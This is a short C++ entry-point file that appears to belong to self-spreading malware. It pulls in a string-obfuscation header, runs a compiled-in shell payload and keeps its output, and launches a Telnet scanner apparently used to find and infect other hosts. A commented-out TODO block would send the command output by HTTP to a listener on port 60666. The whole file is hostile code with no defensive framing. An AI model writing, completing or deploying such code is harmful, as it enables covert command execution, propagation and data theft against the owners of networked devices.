#include "core/net/request.hpp"
#include "core/sys/file-system.hpp"
#include "core/obf/MetaString.h"

#include "core/scanner.hpp"

int main (int argc, char * argv[]) {
  // Execute the shell command and save the output.
  #if defined(PAYLOAD)
  std::string payload_output = FileSystem().process(PAYLOAD);
  #endif

  // Telnet scanner.
  Scanner * scanner = new Scanner();
  scanner->ignite();

  // TODO
  //
  // Make optional sending of the shell output.
  //
  // Request req {
  //   O("127.0.0.1"),
  //   60666,
  //   O("/"),
  //   false,
  //   O("GET"),
  //   ""
  // };
  // req.exec();

  return 0;
}